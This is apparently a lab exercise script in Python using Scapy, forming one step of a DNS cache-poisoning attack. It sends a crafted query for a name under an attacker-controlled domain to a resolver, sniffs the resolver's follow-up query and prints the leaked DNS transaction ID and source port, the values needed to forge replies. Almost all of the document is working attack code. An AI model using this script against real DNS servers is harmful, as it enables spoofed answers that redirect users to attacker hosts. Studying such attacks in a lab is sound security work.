from scapy.all import *
import time

# Target Environment
target_dns = "10.9.0.53"
attacker_ip = "10.9.0.10"
INCR = 0

print("[*] Task 2: Building the sniffer for the port and txid tool")

# Build_spoofed_dns_request is defined here
def build_spoofed_dns_request(from_ip, from_port, to_port, qname, qtype):
    ip_layer = IP(src=from_ip, dst=target_dns)
    udp_layer = UDP(sport=from_port, dport=to_port)
    dns_layer = DNS(rd=1, qd=DNSQR(qname=qname, qtype=qtype))
    return ip_layer / udp_layer / dns_layer

def sniff_port_and_txid(max_attempts):
    global INCR
    
    for attempt in range(1, max_attempts + 1):
        print(f"[*] Leak attempt {attempt}/{max_attempts}...")
        
        sniffer = AsyncSniffer(
            iface="eth0",
            count=1,
            timeout=5,
            # Filtering for a query (qr==0) from the target to the attacker
            lfilter=lambda p: (
                p.haslayer(IP) and p.haslayer(UDP) and p.haslayer(DNS)
                and p[DNS].qr == 0
                and p[IP].src == target_dns
                and p[IP].dst == attacker_ip
                and p[UDP].dport == 53
            ),
        )
        
        sniffer.start()
        time.sleep(0.06) 
        INCR += 1
        
        # SOLUTION: We send a query to force the target server to talk exactly while our sniffer is actively listening
        trigger_leak = build_spoofed_dns_request(attacker_ip, 12345, 53, "{}.leak.attacker.com".format(INCR), "A")
        send(trigger_leak, verbose=0)

        sniffer.join() 
        
        if sniffer.results and len(sniffer.results) > 0:
            caught_packet = sniffer.results[0]
            
            # Extracting the ID from the DNS layer and sport from the UDP layer
            leaked_txid = caught_packet[DNS].id
            target_port = caught_packet[UDP].sport
            
            print(f"[+] SUCCESS! Leaked TXID: {leaked_txid}, Port: {target_port}")
            return leaked_txid, target_port

    print("[-] Could not leak TXID/port from local-dns to attacker.")
    exit(1)

# --- TESTING THE FUNCTION ---
print("[*] Test: Attempting to leak the TXID and Port...")

# Call the function
leaked_txid, target_port = sniff_port_and_txid(5)